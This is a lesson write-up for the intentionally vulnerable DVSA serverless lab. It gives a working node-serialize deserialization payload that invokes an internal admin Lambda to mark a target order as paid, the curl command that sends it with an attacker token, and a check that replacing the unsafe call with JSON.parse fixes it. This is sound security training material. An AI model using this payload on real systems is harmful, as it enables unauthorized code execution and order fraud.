# Lesson 05 - Broken Access Control

> This lesson reused the unsafe deserialization entry point to invoke an internal admin update function in the controlled DVSA lab. Use only lab orders and redact tokens.

## Environment

```bash
export API="https://<api-id>.execute-api.us-east-1.amazonaws.com/Stage/order"
export TOKEN_ATTACKER="<fresh-attacker-jwt>"
export ORDER_ID="<target-unpaid-order-id>"
```

## Generate payload file used in the report style

```bash
python3 - <<'PY' > l5_payload.json
import json, os

order_id = os.environ['ORDER_ID']
body = {
    "action": "_$$ND_FUNC$$_function(){const {LambdaClient,InvokeCommand}=require(\"@aws-sdk/client-lambda\");const lambda=new LambdaClient({});const p={FunctionName:\"DVSA-ADMIN-UPDATE-ORDERS\",InvocationType:\"RequestResponse\",Payload:JSON.stringify({\"orderId\":\"%s\",\"item\":{\"orderStatus\":120,\"totalAmount\":25,\"confirmationToken\":\"L5TOKEN123\"}})};lambda.send(new InvokeCommand(p));}()" % order_id
}
print(json.dumps(body))
PY
```

## Send payload pre-fix

```bash
curl -s "$API" \
  -H "content-type: application/json" \
  -H "authorization: $TOKEN_ATTACKER" \
  --data @l5_payload.json | jq
```

Expected pre-fix evidence: the target order changes to paid with attacker-controlled values such as `L5TOKEN123`.

## Fix verification

After replacing `serialize.unserialize()` with `JSON.parse()`, generate and send the same payload again. Expected behavior:

```text
The action is treated as a string.
No admin update occurs.
The target order state remains unchanged.
```
